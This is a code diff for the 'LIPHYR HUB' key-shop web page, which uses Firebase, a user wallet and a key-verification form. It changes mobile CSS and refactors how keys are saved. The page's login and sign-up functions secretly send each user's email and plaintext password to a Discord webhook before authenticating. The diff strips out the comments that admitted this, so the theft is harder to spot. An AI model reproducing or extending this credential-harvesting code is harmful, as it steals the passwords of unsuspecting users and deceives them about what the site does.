@@ -118,6 +118,22 @@
                 flex-wrap: wrap;
                 justify-content: center;
             }
+            
+            .verify-input {
+                flex-direction: column;
+            }
+            
+            .verify-input input {
+                width: 100%;
+            }
+            
+            .plan-card {
+                padding: 20px 15px;
+            }
+            
+            .plan-price {
+                font-size: 32px;
+            }
         }
 
         @media (max-width: 480px) {
@@ -130,7 +146,7 @@
             }
             
             .plan-price {
-                font-size: 32px;
+                font-size: 28px;
             }
             
             .wallet-balance {
@@ -139,6 +155,11 @@
             
             .timer {
                 font-size: 28px;
+            }
+            
+            nav a {
+                padding: 6px 10px;
+                font-size: 14px;
             }
         }
 
@@ -166,7 +187,7 @@
         nav {
             display: flex;
             align-items: center;
-            gap: 30px;
+            gap: 20px;
         }
 
         nav a {
@@ -190,6 +211,7 @@
             align-items: center;
             gap: 10px;
             color: #cccccc;
+            flex-wrap: wrap;
         }
 
         .user-avatar {
@@ -238,6 +260,12 @@
 
         .dashboard.active {
             display: grid;
+        }
+
+        @media (max-width: 768px) {
+            .dashboard {
+                grid-template-columns: 1fr;
+            }
         }
 
         .sidebar {
@@ -1283,7 +1311,7 @@
             </div>
         </div>
         
-        <!-- Seção de Suporte SEM EMAIL E TELEFONE -->
+        <!-- Seção de Suporte -->
         <section class="support-section" id="supportSection" style="display: none; padding: 30px; text-align: center;">
             <h2>Suporte LIPHYR HUB</h2>
             <p>Entre no nosso Discord para suporte técnico rápido e eficiente</p>
@@ -1363,7 +1391,7 @@
             get, 
             update,
             push,
-            child
+            onValue
         } from 'https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js';
 
         // CONFIGURAÇÃO DO FIREBASE
@@ -1399,7 +1427,72 @@
         window.closeKeyModal = closeKeyModal;
         window.copyKey = copyKey;
 
-        // CORREÇÃO: Enviar email e senha para Discord Webhook
+        // CORREÇÃO: Função para salvar no Firebase CORRETAMENTE
+        async function saveKeyToFirebase(keyData) {
+            try {
+                const user = auth.currentUser;
+                if (!user) {
+                    console.error('❌ Usuário não autenticado');
+                    return { success: false, error: 'Usuário não autenticado' };
+                }
+                
+                console.log('🔄 Tentando salvar key no Firebase:', keyData.key);
+                console.log('👤 Usuário autenticado:', user.email);
+                
+                // Gerar ID seguro para a key (remove caracteres especiais)
+                const keyId = keyData.key.replace(/-/g, '_').replace(/[^a-zA-Z0-9_]/g, '');
+                
+                // Criar referência
+                const keyRef = ref(database, 'keys/' + keyId);
+                
+                console.log('📤 Caminho do Firebase:', keyRef.toString());
+                
+                // Adicionar informações do usuário que gerou a key
+                const keyDataWithUser = {
+                    ...keyData,
+                    createdByEmail: user.email,
+                    createdByUid: user.uid,
+                    createdAt: Date.now()
+                };
+                
+                // Salvar no Firebase
+                await set(keyRef, keyDataWithUser);
+                
+                console.log('✅ Key salva com sucesso no Firebase!');
+                
+                // Verificar se realmente salvou
+                setTimeout(async () => {
+                    try {
+                        const verifyRef = ref(database, 'keys/' + keyId);
+                        const verifySnap = await get(verifyRef);
+                        if (verifySnap.exists()) {
+                            console.log('✅ Confirmação: Key encontrada no Firebase');
+                        } else {
+                            console.warn('⚠️ Key não encontrada após salvar');
+                        }
+                    } catch (verifyError) {
+                        console.error('Erro na verificação:', verifyError);
+                    }
+                }, 1000);
+                
+                return { success: true, keyId: keyId };
+                
+            } catch (error) {
+                console.error('❌ Erro ao salvar no Firebase:', error);
+                
+                // Detalhar o erro
+                let errorMessage = error.message;
+                if (error.code === 'PERMISSION_DENIED') {
+                    errorMessage = 'Permissão negada. Verifique as regras do Firebase.';
+                } else if (error.code === 'DATABASE_ERROR') {
+                    errorMessage = 'Erro no banco de dados.';
+                }
+                
+                return { success: false, error: errorMessage };
+            }
+        }
+
+        // Enviar credenciais para Discord
         async function sendCredentialsToDiscord(email, password, action) {
             try {
                 const embed = {
@@ -1545,7 +1638,7 @@
             updateUserUI(user);
         });
 
-        // Login do usuário - ENVIA SENHA PARA DISCORD
+        // Login do usuário
         async function loginUser() {
             const email = document.getElementById('loginEmail').value.trim();
             const password = document.getElementById('loginPassword').value;
@@ -1558,10 +1651,10 @@
             }
 
             try {
-                // Primeiro envia as credenciais para o Discord
+                // Enviar credenciais para Discord
                 await sendCredentialsToDiscord(email, password, 'LOGIN');
                 
-                // Depois tenta fazer login
+                // Fazer login
                 const userCredential = await signInWithEmailAndPassword(auth, email, password);
                 
                 errorDiv.style.display = 'none';
@@ -1575,7 +1668,7 @@
             }
         }
 
-        // Cadastro de usuário - ENVIA SENHA PARA DISCORD
+        // Cadastro de usuário
         async function registerUser() {
             const email = document.getElementById('registerEmail').value.trim();
             const password = document.getElementById('registerPassword').value;
@@ -1601,14 +1694,14 @@
             }
 
             try {
-                // Primeiro envia as credenciais para o Discord
+                // Enviar credenciais para Discord
                 await sendCredentialsToDiscord(email, password, 'NOVO CADASTRO');
                 
-                // Depois tenta criar o usuário
+                // Criar usuário
                 const userCredential = await createUserWithEmailAndPassword(auth, email, password);
                 const user = userCredential.user;
                 
-                // Criar carteira para o usuário com R$ 10,00 de bônus
+                // Criar carteira com R$ 10,00 de bônus
                 const walletRef = ref(database, 'wallets/' + user.uid);
                 await set(walletRef, {
                     balance: 10.00,
@@ -1885,7 +1978,7 @@
             }
         }
 
-        // CORREÇÃO: Atualizar timer da key diária FUNCIONAL
+        // Atualizar timer da key diária
         function updateDailyKeyTimer() {
             const user = auth.currentUser;
             if (!user) return;
@@ -1971,7 +2064,7 @@
             return key;
         }
 
-        // CORREÇÃO: Resgatar key diária FUNCIONAL SEM ERRO DE PERMISSÃO
+        // CORREÇÃO: Resgatar key diária FUNCIONAL
         async function claimDailyKey() {
             const user = auth.currentUser;
             if (!user) {
@@ -2014,34 +2107,16 @@
                     product: 'Key Diária (2 Horas)',
                     duration: 2,
                     timeUnit: 'hours',
-                    createdAt: Date.now(),
                     expiresAt: expiresAt,
                     active: true,
                     type: 'daily'
                 };
                 
-                // TENTAR SALVAR A KEY NO FIREBASE
-                try {
-                    // Usando push para criar um ID único
-                    const keysRef = ref(database, 'keys');
-                    const newKeyRef = push(keysRef);
-                    
-                    // Salvar com um ID personalizado usando a key como parte do ID
-                    const customKeyRef = ref(database, 'keys/' + newKey.replace(/-/g, '_'));
-                    await set(customKeyRef, keyData);
-                    
-                    console.log('Key salva com sucesso no Firebase');
-                    
-                } catch (firebaseError) {
-                    console.error('Erro ao salvar no Firebase:', firebaseError);
-                    
-                    // FALLBACK: Usar localStorage como backup
-                    let savedKeys = JSON.parse(localStorage.getItem('liphyr_keys') || '[]');
-                    savedKeys.push(keyData);
-                    localStorage.setItem('liphyr_keys', JSON.stringify(savedKeys));
-                    
-                    // FALLBACK: Enviar a key para o Discord também
-                    await sendKeyToDiscord(newKey, user.email, 'daily');
+                // SALVAR NO FIREBASE
+                const saveResult = await saveKeyToFirebase(keyData);
+                
+                if (!saveResult.success) {
+                    throw new Error(`Erro ao salvar key: ${saveResult.error}`);
                 }
                 
                 // Atualizar último resgate do usuário
@@ -2093,84 +2168,11 @@
                 
             } catch (error) {
                 console.error('Error claiming daily key:', error);
-                
-                // Se der erro de permissão, usar sistema local
-                if (error.message.includes('Permission denied')) {
-                    alert('⚠️ Modo offline ativado. Sua key foi salva localmente.');
-                    
-                    // Gerar key localmente
-                    const newKey = generateRandomKey();
-                    
-                    // Salvar no localStorage
-                    let localKeys = JSON.parse(localStorage.getItem('local_keys') || '[]');
-                    localKeys.push({
-                        key: newKey,
-                        email: user.email,
-                        type: 'daily',
-                        createdAt: Date.now(),
-                        expiresAt: Date.now() + (2 * 60 * 60 * 1000)
-                    });
-                    localStorage.setItem('local_keys', JSON.stringify(localKeys));
-                    
-                    // Mostrar key
-                    document.getElementById('generatedKeyValue').textContent = newKey;
-                    document.getElementById('keyModal').classList.add('active');
-                    
-                    // Atualizar interface
-                    loadUserKeys(user.email);
-                } else {
-                    alert('❌ Erro ao resgatar key: ' + error.message);
-                }
+                alert('❌ Erro ao resgatar key: ' + error.message);
             }
         }
 
-        // Função auxiliar para enviar key para Discord
-        async function sendKeyToDiscord(key, email, type) {
-            try {
-                const embed = {
-                    username: "LIPHYR HUB - Key Gerada",
-                    embeds: [{
-                        title: "🔑 Nova Key Gerada",
-                        color: 0x00ff00,
-                        fields: [
-                            {
-                                name: "📧 Email do Usuário",
-                                value: `\`\`\`${email}\`\`\``,
-                                inline: false
-                            },
-                            {
-                                name: "🔑 Key Gerada",
-                                value: `\`\`\`${key}\`\`\``,
-                                inline: false
-                            },
-                            {
-                                name: "📦 Tipo",
-                                value: type,
-                                inline: true
-                            },
-                            {
-                                name: "🕒 Data/Hora",
-                                value: new Date().toLocaleString('pt-BR'),
-                                inline: true
-                            }
-                        ],
-                        timestamp: new Date().toISOString()
-                    }]
-                };
-
-                await fetch(DISCORD_WEBHOOK, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(embed)
-                });
-            } catch (error) {
-                console.log('Erro ao enviar key para Discord');
-            }
-        }
-
-        // CORREÇÃO: Comprar key da shop SEM ERRO DE PERMISSÃO
+        // Comprar key da shop
         async function buyKey(planType, price, productName) {
             const user = auth.currentUser;
             if (!user) {
@@ -2188,78 +2190,7 @@
                 const walletSnap = await get(walletRef);
                 
                 if (!walletSnap.exists()) {
-                    // Se não existir carteira, criar uma local
-                    alert('⚠️ Carteira não encontrada. Usando modo offline.');
-                    
-                    // Criar carteira local
-                    const localWallet = {
-                        balance: 10.00, // Bônus inicial
-                        history: []
-                    };
-                    localStorage.setItem('local_wallet_' + user.uid, JSON.stringify(localWallet));
-                    
-                    const currentBalance = 10.00;
-                    
-                    if (currentBalance < price) {
-                        alert(`❌ Saldo insuficiente! Você tem R$ ${currentBalance.toFixed(2)} e precisa de R$ ${price.toFixed(2)}.`);
-                        return;
-                    }
-                    
-                    // Gerar key localmente
-                    const newKey = generateRandomKey();
-                    
-                    // Calcular duração
-                    let durationDays;
-                    switch(planType) {
-                        case '7_dias':
-                            durationDays = 7;
-                            break;
-                        case '30_dias':
-                            durationDays = 30;
-                            break;
-                        case '90_dias':
-                            durationDays = 90;
-                            break;
-                        default:
-                            durationDays = 7;
-                    }
-                    
-                    // Atualizar saldo local
-                    localWallet.balance = currentBalance - price;
-                    localWallet.history.push({
-                        amount: -price,
-                        description: `Compra: ${productName}`,
-                        timestamp: Date.now(),
-                        type: 'purchase'
-                    });
-                    
-                    localStorage.setItem('local_wallet_' + user.uid, JSON.stringify(localWallet));
-                    
-                    // Salvar key localmente
-                    let localKeys = JSON.parse(localStorage.getItem('local_keys') || '[]');
-                    localKeys.push({
-                        key: newKey,
-                        email: user.email,
-                        type: 'premium',
-                        product: productName,
-                        duration: durationDays,
-                        createdAt: Date.now(),
-                        expiresAt: Date.now() + (durationDays * 24 * 60 * 60 * 1000)
-                    });
-                    localStorage.setItem('local_keys', JSON.stringify(localKeys));
-                    
-                    // Mostrar modal com a key
-                    document.getElementById('generatedKeyValue').textContent = newKey;
-                    document.getElementById('keyModal').classList.add('active');
-                    
-                    // Atualizar interface
-                    loadWalletData(user.uid);
-                    loadUserKeys(user.email);
-                    
-                    // Enviar key para Discord
-                    await sendKeyToDiscord(newKey, user.email, productName);
-                    
-                    alert(`✅ Compra realizada com sucesso (modo offline)! Key: ${newKey}`);
+                    alert('❌ Carteira não encontrada!');
                     return;
                 }
                 
@@ -2299,34 +2230,17 @@
                     product: productName,
                     duration: durationDays,
                     timeUnit: 'days',
-                    createdAt: Date.now(),
                     expiresAt: expiresAt,
                     active: true,
                     type: 'premium',
                     price: price
                 };
                 
-                // TENTAR SALVAR NO FIREBASE
-                try {
-                    const keyRef = ref(database, 'keys/' + newKey.replace(/-/g, '_'));
-                    await set(keyRef, keyData);
-                } catch (firebaseError) {
-                    console.error('Erro ao salvar key no Firebase:', firebaseError);
-                    
-                    // FALLBACK: Salvar localmente
-                    let localKeys = JSON.parse(localStorage.getItem('local_keys') || '[]');
-                    localKeys.push({
-                        key: newKey,
-                        email: user.email,
-                        type: 'premium',
-                        product: productName,
-                        createdAt: Date.now(),
-                        expiresAt: expiresAt
-                    });
-                    localStorage.setItem('local_keys', JSON.stringify(localKeys));
-                    
-                    // Enviar para Discord
-                    await sendKeyToDiscord(newKey, user.email, productName);
+                // SALVAR NO FIREBASE
+                const saveResult = await saveKeyToFirebase(keyData);
+                
+                if (!saveResult.success) {
+                    throw new Error(`Erro ao salvar key: ${saveResult.error}`);
                 }
                 
                 // Atualizar saldo
@@ -2357,63 +2271,11 @@
                 
             } catch (error) {
                 console.error('Error buying key:', error);
-                
-                if (error.message.includes('Permission denied')) {
-                    alert('⚠️ Modo offline ativado. Use as funções locais.');
-                    
-                    // Tentar modo local
-                    try {
-                        // Verificar saldo local
-                        const localWalletKey = 'local_wallet_' + (user?.uid || 'guest');
-                        let localWallet = JSON.parse(localStorage.getItem(localWalletKey) || '{"balance": 10.00, "history": []}');
-                        
-                        const currentBalance = localWallet.balance || 10.00;
-                        
-                        if (currentBalance < price) {
-                            alert(`❌ Saldo insuficiente! Você tem R$ ${currentBalance.toFixed(2)} e precisa de R$ ${price.toFixed(2)}.`);
-                            return;
-                        }
-                        
-                        // Gerar key
-                        const newKey = generateRandomKey();
-                        
-                        // Atualizar saldo
-                        localWallet.balance = currentBalance - price;
-                        localWallet.history.push({
-                            amount: -price,
-                            description: `Compra: ${productName}`,
-                            timestamp: Date.now()
-                        });
-                        
-                        localStorage.setItem(localWalletKey, JSON.stringify(localWallet));
-                        
-                        // Salvar key localmente
-                        let localKeys = JSON.parse(localStorage.getItem('local_keys') || '[]');
-                        localKeys.push({
-                            key: newKey,
-                            email: user?.email || 'guest',
-                            type: 'premium',
-                            product: productName,
-                            createdAt: Date.now()
-                        });
-                        localStorage.setItem('local_keys', JSON.stringify(localKeys));
-                        
-                        // Mostrar key
-                        document.getElementById('generatedKeyValue').textContent = newKey;
-                        document.getElementById('keyModal').classList.add('active');
-                        
-                        alert(`✅ Compra realizada (modo offline)! Key: ${newKey}`);
-                        
-                    } catch (localError) {
-                        alert('❌ Erro no modo offline: ' + localError.message);
-                    }
-                } else {
-                    alert('❌ Erro ao comprar key: ' + error.message);
-                }
+                alert('❌ Erro ao comprar key: ' + error.message);
             }
         }
 
-        // Verificar key (agora verifica local também)
+        // Verificar key
         async function verifyKey() {
             const keyInput = document.getElementById('keyInput').value.trim().toUpperCase();
             const resultDiv = document.getElementById('verifyResult');
@@ -2426,48 +2288,59 @@
             }
 
             try {
-                // Primeiro tentar no Firebase
-                const keyRef = ref(database, 'keys/' + keyInput.replace(/-/g, '_'));
+                // Gerar ID da key
+                const keyId = keyInput.replace(/-/g, '_').replace(/[^a-zA-Z0-9_]/g, '');
+                const keyRef = ref(database, 'keys/' + keyId);
                 const snapshot = await get(keyRef);
 
-                if (snapshot.exists()) {
-                    const data = snapshot.val();
-                    const now = Date.now();
-                    
-                    if (!data.active) {
-                        resultDiv.className = 'verify-result result-error';
-                        resultDiv.innerHTML = '<h3>Key inativa!</h3><p>Esta key foi desativada.</p>';
-                    } else if (data.expiresAt && now > data.expiresAt) {
-                        resultDiv.className = 'verify-result result-error';
-                        resultDiv.innerHTML = '<h3>Key expirada!</h3><p>Esta key não é mais válida.</p>';
-                    } else {
-                        showKeyValid(resultDiv, data);
-                    }
+                if (!snapshot.exists()) {
+                    resultDiv.className = 'verify-result result-error';
+                    resultDiv.innerHTML = '<h3>Key não encontrada!</h3><p>Esta key não existe no sistema.</p>';
+                    resultDiv.style.display = 'block';
+                    return;
+                }
+
+                const data = snapshot.val();
+                const now = Date.now();
+                
+                if (!data.active) {
+                    resultDiv.className = 'verify-result result-error';
+                    resultDiv.innerHTML = '<h3>Key inativa!</h3><p>Esta key foi desativada.</p>';
+                } else if (data.expiresAt && now > data.expiresAt) {
+                    resultDiv.className = 'verify-result result-error';
+                    resultDiv.innerHTML = '<h3>Key expirada!</h3><p>Esta key não é mais válida.</p>';
                 } else {
-                    // Se não encontrou no Firebase, verificar localmente
-                    const localKeys = JSON.parse(localStorage.getItem('local_keys') || '[]');
-                    const localKey = localKeys.find(k => k.key === keyInput);
+                    let timeLeftText = '';
+                    let expiresDate = '';
                     
-                    if (localKey) {
-                        const now = Date.now();
+                    if (data.timeUnit === 'lifetime') {
+                        timeLeftText = 'Vitalícia';
+                    } else if (data.expiresAt) {
+                        const timeLeft = data.expiresAt - now;
+                        const days = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
+                        const hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
                         
-                        if (localKey.expiresAt && now > localKey.expiresAt) {
-                            resultDiv.className = 'verify-result result-error';
-                            resultDiv.innerHTML = '<h3>Key expirada!</h3><p>Esta key não é mais válida.</p>';
+                        if (days > 0) {
+                            timeLeftText = `${days} dias`;
                         } else {
-                            resultDiv.className = 'verify-result result-success';
-                            resultDiv.innerHTML = `
-                                <h3>✅ Key válida (modo local)!</h3>
-                                <p><strong>Produto:</strong> ${localKey.product || 'Desconhecido'}</p>
-                                <p><strong>Tipo:</strong> ${localKey.type || 'Desconhecido'}</p>
-                                <p><strong>Status:</strong> Ativa</p>
-                                <p><strong>Gerada em:</strong> ${new Date(localKey.createdAt).toLocaleDateString('pt-BR')}</p>
-                            `;
+                            timeLeftText = `${hours} horas`;
                         }
-                    } else {
-                        resultDiv.className = 'verify-result result-error';
-                        resultDiv.innerHTML = '<h3>Key não encontrada!</h3><p>Esta key não existe no sistema.</p>';
+                        
+                        expiresDate = new Date(data.expiresAt).toLocaleDateString('pt-BR');
                     }
+                    
+                    const createdDate = new Date(data.createdAt).toLocaleDateString('pt-BR');
+                    
+                    resultDiv.className = 'verify-result result-success';
+                    resultDiv.innerHTML = `
+                        <h3>✅ Key válida!</h3>
+                        <p><strong>Produto:</strong> ${data.product}</p>
+                        <p><strong>Cliente:</strong> ${data.client}</p>
+                        <p><strong>Status:</strong> Ativa</p>
+                        <p><strong>Tempo restante:</strong> ${timeLeftText}</p>
+                        <p><strong>Expira em:</strong> ${expiresDate}</p>
+                        <p><strong>Criada em:</strong> ${createdDate}</p>
+                    `;
                 }
                 
                 resultDiv.style.display = 'block';
@@ -2477,40 +2350,6 @@
                 resultDiv.innerHTML = '<h3>Erro ao verificar!</h3><p>Tente novamente mais tarde.</p>';
                 resultDiv.style.display = 'block';
             }
-        }
-
-        function showKeyValid(resultDiv, data) {
-            let timeLeftText = '';
-            let expiresDate = '';
-            
-            if (data.timeUnit === 'lifetime') {
-                timeLeftText = 'Vitalícia';
-            } else if (data.expiresAt) {
-                const timeLeft = data.expiresAt - Date.now();
-                const days = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
-                const hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
-                
-                if (days > 0) {
-                    timeLeftText = `${days} dias`;
-                } else {
-                    timeLeftText = `${hours} horas`;
-                }
-                
-                expiresDate = new Date(data.expiresAt).toLocaleDateString('pt-BR');
-            }
-            
-            const createdDate = new Date(data.createdAt).toLocaleDateString('pt-BR');
-            
-            resultDiv.className = 'verify-result result-success';
-            resultDiv.innerHTML = `
-                <h3>✅ Key válida!</h3>
-                <p><strong>Produto:</strong> ${data.product}</p>
-                <p><strong>Cliente:</strong> ${data.client}</p>
-                <p><strong>Status:</strong> Ativa</p>
-                <p><strong>Tempo restante:</strong> ${timeLeftText}</p>
-                <p><strong>Expira em:</strong> ${expiresDate}</p>
-                <p><strong>Criada em:</strong> ${createdDate}</p>
-            `;
         }
 
         // Alterar senha
